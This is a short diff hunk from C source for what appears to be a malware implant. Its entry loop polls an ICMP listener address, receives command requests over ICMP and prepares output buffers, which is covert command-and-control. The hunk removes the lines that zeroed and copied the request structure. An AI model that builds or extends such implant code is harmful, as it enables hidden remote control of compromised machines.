@@ -120,14 +120,6 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					if ( IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Ctx->Id, sizeof( Ctx->Id ), &Inb->Buffer, &Inb->Length, &Rcv ) ) {
 						if ( Rcv != FALSE && Inb->Buffer != NULL && Inb->Length != 0 ) {
 							if ( Inb->Length >= sizeof( CMD_REQ_HDR ) ) {
-
-								/* Prepare the stack structures */
-								RtlSecureZeroMemory( &Req, sizeof( Req ) );
-								RtlSecureZeroMemory( &Ret, sizeof( Ret ) );
-
-								/* Copy over the request */
-								__builtin_memcpy( &Req, Inb->Buffer, sizeof( Req ) );
-
 								/* Create an output buffer */
 								if ( ( Onb = BufferCreate() ) != NULL ) {
 									/* Add the ID to the front of the buffer */
